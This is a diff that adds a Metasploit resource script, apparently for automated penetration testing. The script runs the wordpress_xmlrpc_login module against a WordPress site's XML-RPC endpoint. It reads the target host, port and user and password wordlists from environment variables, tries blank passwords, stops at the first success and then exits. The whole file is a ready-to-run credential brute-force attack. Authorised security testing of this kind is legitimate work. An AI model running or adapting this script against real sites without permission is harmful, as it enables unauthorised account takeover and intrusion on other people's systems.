@@ -1,0 +1,14 @@
+use auxiliary/scanner/http/wordpress_xmlrpc_login
+set targeturi /wordpress
+set blank_passwords true
+set stop_on_success true
+<ruby>
+#Set the target host
+run_single("set RHOST #{ENV['IP_ADDR']}")
+run_single("set RPORT #{ENV['PORT_NO']}")
+run_single("set user_file #{ENV['USER_FILE']}")
+run_single("set pass_file #{ENV['PASS_FILE']}")
+</ruby>
+exploit -z
+sessions -K
+quit
